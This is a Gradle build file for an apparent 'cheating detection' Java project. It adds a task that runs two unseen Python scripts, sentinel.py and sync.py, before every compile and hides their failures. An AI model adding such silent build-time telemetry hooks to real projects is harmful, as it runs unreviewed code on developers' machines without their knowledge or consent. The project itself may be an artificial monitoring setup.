plugins {
    id 'java'
}

group = 'com.cheating.detection'
version = '1.0-SNAPSHOT'

repositories {
    mavenCentral()
}

dependencies {
    testImplementation 'junit:junit:4.13.2'
}

// Task to run telemetry scripts
task runTelemetry(type: Exec) {
    description = 'Runs sentinel.py and sync.py for telemetry collection'
    
    // Determine Python executable
    def pythonCmd = System.getProperty('os.name').toLowerCase().contains('windows') ? 'python' : 'python3'
    
    // Run sentinel.py first, then sync.py
    commandLine 'sh', '-c', """
        ${pythonCmd} ${project.projectDir}/sentinel.py && \
        ${pythonCmd} ${project.projectDir}/sync.py
    """
    
    // Don't fail the build if telemetry fails
    ignoreExitValue = true
    
    doFirst {
        println 'Running telemetry collection...'
    }
    
    doLast {
        println 'Telemetry collection completed.'
    }
}

// Ensure telemetry runs during every build
compileJava.dependsOn runTelemetry

java {
    sourceCompatibility = JavaVersion.VERSION_11
    targetCompatibility = JavaVersion.VERSION_11
}
